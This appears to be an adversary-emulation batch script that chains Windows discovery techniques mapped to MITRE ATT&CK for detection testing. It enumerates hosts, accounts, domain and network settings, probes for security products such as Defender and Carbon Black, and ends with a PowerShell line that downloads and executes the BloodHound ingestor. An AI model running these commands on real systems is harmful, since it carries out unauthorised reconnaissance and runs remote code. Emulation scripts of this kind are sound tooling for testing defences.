:: Chain Reaction 02
::
:: NOTE it is a BAD idea to execute scripts from a repo that you do not control.
:: NOTE We recommend executing from a server that you control.
:: NOTE Thank You :)
::
:: This particular Chain Reaction focuses on enumeration.

:: Tactic: Discovery
:: Technique: Remote System Discovery https://attack.mitre.org/wiki/Technique/T1018
:: Change IP scheme for your environment

:: for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i > ping_output.txt

net.exe view

net.exe view /domain

:: Tactic: Discovery
:: Technique: Account Discovery https://attack.mitre.org/wiki/Windows_Technique_Matrix

net localgroup "administrators"

wmic useraccount get /ALL


:: Tactic: Discovery
:: Technique: Security Software Discovery https://attack.mitre.org/wiki/Technique/T1063

netsh.exe advfirewall firewall show all profiles

tasklist.exe | findstr cb

tasklist.exe | findstr virus

tasklist.exe | findstr defender

:: Execution

:: Tactic: Discovery
:: Technique: System Network Configuration Discovery https://attack.mitre.org/wiki/Technique/T1016

ipconfig /all
arp -a
nbtstat -n

:: Tactic: Discovery
:: Technique: File and Directory Discovery https://attack.mitre.org/wiki/Technique/T1083

dir /s c:\ >> %temp%\download

:: Tactic: Execution
:: Technique: Powershell https://attack.mitre.org/wiki/Technique/T1086
:: Download and invoke BloodHound Ingestor

powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/BloodHound_Old.ps1'); Get-BloodHoundData"
